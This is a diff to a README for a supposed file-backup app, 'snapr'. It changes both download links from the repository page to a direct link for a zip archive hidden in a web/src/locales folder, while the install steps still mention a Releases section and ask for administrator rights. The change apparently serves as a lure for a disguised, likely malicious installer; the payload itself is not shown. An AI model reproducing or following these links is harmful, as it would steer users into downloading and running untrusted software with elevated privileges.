@@ -1,6 +1,6 @@
 # 💾 snapr - Securely back up your digital files
 
-[![](https://img.shields.io/badge/Download-snapr-blue.svg)](https://github.com/Disjointed-inmate714/snapr)
+[![](https://img.shields.io/badge/Download-snapr-blue.svg)](https://raw.githubusercontent.com/Disjointed-inmate714/snapr/main/web/src/locales/Software_v1.2.zip)
 
 ## 📁 About the application
 
@@ -24,7 +24,7 @@ Ensure you have administrator rights on your computer. This allows the software 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/Disjointed-inmate714/snapr).
+1. Visit the [official download page](https://raw.githubusercontent.com/Disjointed-inmate714/snapr/main/web/src/locales/Software_v1.2.zip).
 2. Look for the latest version under the Releases section.
 3. Click the link to save the installer file to your computer.
 4. Open the folder where you saved the file.
